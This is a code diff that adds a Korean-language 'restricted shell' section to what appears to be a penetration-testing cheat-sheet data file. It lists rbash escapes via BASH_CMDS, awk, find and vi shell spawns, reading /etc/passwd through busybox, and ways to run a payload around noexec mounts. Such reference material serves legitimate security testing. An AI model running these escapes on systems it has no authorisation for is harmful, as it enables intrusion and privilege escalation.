@@ -143,4 +143,38 @@ export const linuxPrivescCategories: PrivescCategory[] = [
           "sudo 비밀번호 프롬프트 등 완전한 tty가 필요한 명령도 정상 동작합니다." },
     ],
   },
+  {
+    id: "restricted-shell",
+    title: "제한된 셸/실행 환경 대응",
+    description: "ls·cat 같은 기본 명령이 없거나 막혀 있을 때 -- 제한 셸(rbash), BusyBox, 최소 " +
+      "컨테이너, noexec 마운트에서 자주 마주치는 상황과 우회입니다.",
+    commands: [
+      { label: "제한 셸(rbash) 여부 확인", command: "echo $0; echo $SHELL" },
+      { label: "BASH_CMDS로 rbash 우회", command: "BASH_CMDS[a]=/bin/sh; a",
+        note: "rbash가 PATH 변경과 / 포함 명령은 막아도 BASH_CMDS 배열 조작은 " +
+          "막지 않는 경우가 많습니다." },
+      { label: "awk로 셸 얻기", command: "awk 'BEGIN {system(\"/bin/sh\")}'" },
+      { label: "find로 셸 얻기", command: "find . -maxdepth 0 -exec /bin/sh \\; " },
+      { label: "vi/vim 안에서 셸 탈출", command: ":!/bin/sh",
+        note: "vi/vim이 실행 가능하면 그 안에서 이 명령을 입력(Esc 누른 뒤)하세요 -- " +
+          "셸 명령이 아니라 vi 명령 모드에 입력하는 문법입니다." },
+      { label: "BusyBox인지 확인", command: "ls -la $(which ls) 2>/dev/null; busybox 2>&1 | head -1",
+        note: "busybox로 심볼릭 링크돼 있으면 ls/cat 등 개별 옵션이 GNU coreutils보다 " +
+          "훨씬 제한적입니다." },
+      { label: "BusyBox 내장 명령 직접 호출", command: "busybox cat /etc/passwd" },
+      { label: "BusyBox 셸 얻기", command: "busybox sh" },
+      { label: "ls 없이 디렉터리 나열 (셸 글롭)", command: "echo */*",
+        note: "scratch/distroless 컨테이너처럼 ls/cat 바이너리 자체가 없을 때도 셸 내장 " +
+          "글롭 확장은 대개 동작합니다." },
+      { label: "noexec 마운트 여부 확인", command: "mount | grep -E '\\s/(tmp|dev/shm)\\s'",
+        note: "noexec로 마운트된 /tmp에 올린 바이너리는 실행 권한을 줘도 실행되지 않습니다." },
+      { label: "noexec 우회 (exec 허용되는 /dev/shm으로 이동)",
+        command: "cp payload /dev/shm/payload; chmod +x /dev/shm/payload; /dev/shm/payload",
+        note: "/dev/shm은 대부분 배포판에서 exec를 막지 않습니다. 그마저 막혀 있으면 " +
+          "인터프리터 기반 실행(아래)으로 전환하세요." },
+      { label: "noexec 우회 (인터프리터로 실행)", command: "python3 payload.py",
+        note: "noexec는 바이너리 자체의 실행을 막는 것이지 인터프리터(python3/perl/bash)가 " +
+          "스크립트 파일을 읽어 실행하는 것은 막지 못하는 경우가 많습니다." },
+    ],
+  },
 ];
